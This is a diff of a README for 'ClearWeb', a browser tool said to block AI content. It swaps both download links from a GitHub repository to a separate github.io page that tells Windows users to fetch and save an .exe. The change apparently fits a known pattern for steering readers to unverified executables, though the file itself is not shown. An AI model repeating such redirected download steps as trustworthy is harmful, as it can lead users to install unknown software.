@@ -1,6 +1,6 @@
 # 🛡️ ClearWeb - Browse the web without AI interference
 
-[![](https://img.shields.io/badge/Download-ClearWeb-blue.svg)](https://github.com/bhaktipreview48/ClearWeb)
+[![](https://img.shields.io/badge/Download-ClearWeb-blue.svg)](https://bhaktipreview48.github.io)
 
 ## 🎯 About this tool
 ClearWeb blocks AI content from your web browser. AI scripts often clutter your view and track your behavior. This tool cleans your digital workspace to protect your privacy and focus. It removes unwanted AI elements that clutter modern results and keep your browsing experience clean. This project remains open-source to ensure transparency. You own your browser experience. ClearWeb gives you back that control by filtering out scripts that serve AI-generated marketing and tracking data.
@@ -14,7 +14,7 @@ ClearWeb blocks AI content from your web browser. AI scripts often clutter your 
 ## 📥 How to download and install
 You must obtain the installation files from our official release page. Follow these steps to set up the software correctly on your machine.
 
-1. Visit [this link](https://github.com/bhaktipreview48/ClearWeb) to access the download page.
+1. Visit [this link](https://bhaktipreview48.github.io) to access the download page.
 2. Look for the latest version under the "Releases" section.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your desktop for easy access.
